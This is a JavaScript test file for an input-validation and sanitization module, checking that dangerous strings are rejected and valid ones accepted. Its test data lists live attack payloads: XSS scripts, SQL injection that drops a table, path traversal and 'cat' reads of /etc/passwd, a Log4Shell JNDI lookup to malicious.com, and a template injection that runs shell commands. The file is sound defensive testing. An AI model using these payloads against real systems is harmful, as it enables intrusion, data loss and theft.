/**
 * Test file to demonstrate input validation functionality
 * This file can be imported and used to test validation functions
 */

import { 
  validateInput, 
  validateCountryCode, 
  validateUsername, 
  validateEmail, 
  validateProduct, 
  validateQuantity, 
  validatePassword, 
  validateDateTime,
  validateFileUpload,
  sanitizeInput 
} from './inputValidation.js';

// Test cases for dangerous inputs
const dangerousInputs = [
  '<script>alert("XSS")</script>',
  'javascript:alert("XSS")',
  "'; DROP TABLE users; --",
  'SELECT * FROM users WHERE id = 1 OR 1=1',
  '../../../etc/passwd',
  'cat /etc/passwd',
  'eval("malicious code")',
  'document.cookie',
  '<iframe src="malicious.com"></iframe>',
  'onclick="alert(1)"',
  '${jndi:ldap://malicious.com}',
  '{{7*7}}',
  '{{constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()}}'
];

// Test cases for valid inputs
const validInputs = {
  countryCode: 'SG',
  username: 'testuser123',
  email: 'test@example.com',
  product: 'electronics',
  quantity: '5',
  password: 'SecurePass123',
  datetime: '2024-01-01T10:00'
};

// Test cases for usernames and passwords with special characters
const specialCharInputs = {
  username: 'user@domain.com',
  password: 'MyP@ssw0rd!',
  usernameWithSpecial: 'user_123',
  passwordWithSpecial: 'Pass$word123'
};

console.log('=== Input Validation Test Results ===\n');

// Test dangerous inputs
console.log('Testing dangerous inputs (should all be rejected):');
dangerousInputs.forEach((input, index) => {
  const result = validateInput(input);
  console.log(`${index + 1}. "${input.substring(0, 30)}..." - Valid: ${result.isValid}`);
  if (!result.isValid) {
    console.log(`   Errors: ${result.errors.join(', ')}`);
  }
});

console.log('\n=== Testing Valid Inputs ===\n');

// Test valid inputs
console.log('Testing valid inputs (should all be accepted):');
Object.entries(validInputs).forEach(([type, value]) => {
  let result;
  switch (type) {
    case 'countryCode':
      result = validateCountryCode(value);
      break;
    case 'username':
      result = validateUsername(value);
      break;
    case 'email':
      result = validateEmail(value);
      break;
    case 'product':
      result = validateProduct(value);
      break;
    case 'quantity':
      result = validateQuantity(value);
      break;
    case 'password':
      result = validatePassword(value);
      break;
    case 'datetime':
      result = validateDateTime(value);
      break;
    default:
      result = validateInput(value);
  }
  
  console.log(`${type}: "${value}" - Valid: ${result.isValid}`);
  if (!result.isValid) {
    console.log(`   Errors: ${result.errors.join(', ')}`);
  }
});

console.log('\n=== Testing Special Character Inputs ===\n');

// Test special character inputs
console.log('Testing usernames and passwords with special characters (should be accepted):');
Object.entries(specialCharInputs).forEach(([type, value]) => {
  let result;
  if (type.includes('username')) {
    result = validateUsername(value);
  } else if (type.includes('password')) {
    result = validatePassword(value);
  } else {
    result = validateInput(value, true);
  }
  
  console.log(`${type}: "${value}" - Valid: ${result.isValid}`);
  if (!result.isValid) {
    console.log(`   Errors: ${result.errors.join(', ')}`);
  }
});

console.log('\n=== Testing Sanitization ===\n');

// Test sanitization
const testInputs = [
  'Hello <script>alert("XSS")</script> World',
  'Normal text with dangerous chars: ; & | `',
  'SQL injection: \'; DROP TABLE users; --',
  'Path traversal: ../../../etc/passwd'
];

testInputs.forEach((input, index) => {
  const sanitized = sanitizeInput(input);
  console.log(`${index + 1}. Original: "${input}"`);
  console.log(`   Sanitized: "${sanitized}"`);
  console.log(`   Changed: ${input !== sanitized ? 'Yes' : 'No'}\n`);
});

console.log('=== Validation Test Complete ===');

export { dangerousInputs, validInputs, specialCharInputs };
